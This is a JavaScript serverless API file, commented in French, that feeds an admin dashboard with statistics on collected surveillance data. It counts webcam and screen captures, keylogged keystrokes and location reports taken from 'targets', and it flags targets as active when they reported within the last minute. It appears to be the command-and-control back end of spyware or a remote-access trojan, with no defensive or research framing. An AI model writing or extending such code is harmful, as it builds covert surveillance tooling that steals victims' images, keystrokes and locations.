// api/stats.js - Statistiques pour le panneau admin
import { kv } from '@vercel/kv';

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
    
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    
    if (req.method !== 'GET') {
        return res.status(405).json({ error: 'Method not allowed' });
    }
    
    try {
        // Récupérer les statistiques depuis KV
        const keys = await kv.lrange('data:list', 0, -1);
        
        let stats = {
            images: 0,
            keys: 0,
            location: 0,
            activeTargets: 0,
            lastActivity: null
        };
        
        // Compter par type
        for (const key of keys) {
            const data = await kv.get(key);
            if (data) {
                if (data.type === 'camera' || data.type === 'screen') {
                    stats.images++;
                } else if (data.type === 'keylog') {
                    stats.keys += (data.keys || '').length;
                } else if (data.type === 'location') {
                    stats.location++;
                }
                
                // Vérifier l'activité récente (moins de 1 minute)
                const timestamp = parseInt(key.split(':')[1]);
                if (Date.now() - timestamp < 60000) {
                    stats.lastActivity = timestamp;
                }
            }
        }
        
        // Compter les cibles actives (activité dans la dernière minute)
        if (stats.lastActivity) {
            stats.activeTargets = 1; // Simplification, à améliorer avec tracking par client
        }
        
        res.status(200).json(stats);
    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
}
